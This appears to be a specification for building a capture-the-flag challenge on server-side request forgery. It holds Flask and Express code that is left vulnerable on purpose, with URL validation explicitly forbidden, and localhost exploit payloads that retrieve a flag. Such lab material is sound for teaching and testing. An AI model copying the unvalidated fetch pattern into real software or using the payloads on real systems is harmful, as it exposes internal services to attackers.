# Server-Side Request Forgery (SSRF)

## Vulnerability Type
`ssrf` — CWE-918 — OWASP A10:2021 SSRF

## Architecture
- **Backend**: Python Flask OR Node.js Express
- **Database**: None required
- **Container**: Single container with internal-only flag endpoint

## Vulnerable Code Pattern (MUST USE)

### Python Flask (Preferred)
```python
import requests

# Internal flag endpoint — only accessible from localhost
@app.route('/internal/flag')
def internal_flag():
    if request.remote_addr not in ('127.0.0.1', '::1'):
        return "Forbidden", 403
    return FLAG

# VULNERABLE: ssrf — user-supplied URL passed directly to requests.get
@app.route('/fetch', methods=['POST'])
def fetch_url():
    url = request.form.get('url', '')
    try:
        resp = requests.get(url, timeout=5)
        return resp.text
    except Exception as e:
        return f"Error: {e}"
```

### Node.js Express
```javascript
const axios = require('axios');

// Internal flag endpoint
app.get('/internal/flag', (req, res) => {
    if (req.ip !== '127.0.0.1' && req.ip !== '::1' && req.ip !== '::ffff:127.0.0.1') {
        return res.status(403).send('Forbidden');
    }
    res.send(process.env.FLAG);
});

// VULNERABLE: ssrf — user-supplied URL passed directly to axios.get
app.post('/fetch', async (req, res) => {
    const url = req.body.url || '';
    try {
        const response = await axios.get(url, { timeout: 5000 });
        res.send(response.data);
    } catch (e) {
        res.send(`Error: ${e.message}`);
    }
});
```

## Secure Code Pattern (MUST AVOID)
```python
# SAFE — URL validation (DO NOT USE)
from urllib.parse import urlparse
parsed = urlparse(url)
if parsed.hostname in ('127.0.0.1', 'localhost', '0.0.0.0'):
    return "Blocked", 403
# SAFE — allowlist (DO NOT USE)
ALLOWED_DOMAINS = ['example.com', 'api.github.com']
if parsed.hostname not in ALLOWED_DOMAINS:
    return "Domain not allowed", 403
```

## Flag Delivery
- Flag at internal endpoint `/internal/flag` that only responds to 127.0.0.1
- Player uses SSRF to make the server request its own internal endpoint
- Response content forwarded back to the player

## Exploit Payload
```
POST /fetch
url=http://127.0.0.1:3000/internal/flag
```
Alternative payloads:
```
url=http://0.0.0.0:3000/internal/flag
url=http://localhost:3000/internal/flag
url=http://[::1]:3000/internal/flag
```

## Validation Criteria
- No URL validation, scheme checking, or domain allowlist/blocklist
- No `urlparse()` or hostname checking before making the request
- Internal flag endpoint MUST exist and return the flag for localhost requests
- Response from fetched URL MUST be returned to the user
- `http://127.0.0.1:3000/internal/flag` request MUST return the flag
